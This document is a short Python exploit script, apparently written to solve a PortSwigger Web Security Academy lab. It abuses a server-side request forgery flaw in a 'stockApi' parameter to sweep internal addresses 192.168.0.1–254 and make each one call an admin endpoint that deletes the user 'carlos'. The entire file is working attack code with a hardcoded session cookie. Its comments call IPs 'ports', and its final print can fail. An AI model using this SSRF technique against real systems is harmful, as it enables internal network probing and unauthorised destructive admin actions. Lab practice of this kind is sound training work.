import requests

url = "https://0a0100f7038f59e480dd0d38008b0067.web-security-academy.net/"

def main(ip):
    cookies = {
    "session" : "fWdKX2xnclMgmIPOxa8gQax3087aCJym"
    }
    
    data = {
        "stockApi" : f"http://192.168.0.{ip}:8080/admin/delete?username=carlos"
    }

    r = requests.post(f"{url}/product/stock", data=data, cookies=cookies)
    return r

for ip in range(1, 255):
    print(f"Testing: {ip}")

    try:
        r = main(ip)

        print(f"For testing port {ip}, status code is {r.status_code}")

        if r.status_code not in [400, 500]:
            print(f"[+] Possible Open Port Found: {ip}")
            print(r.text)
            break

    except requests.exceptions.Timeout:
        print(f"[+] Possible Open Port Found by timeout: {ip}")
        break  

print("Status Code is: ", r.status_code)
print(r.text)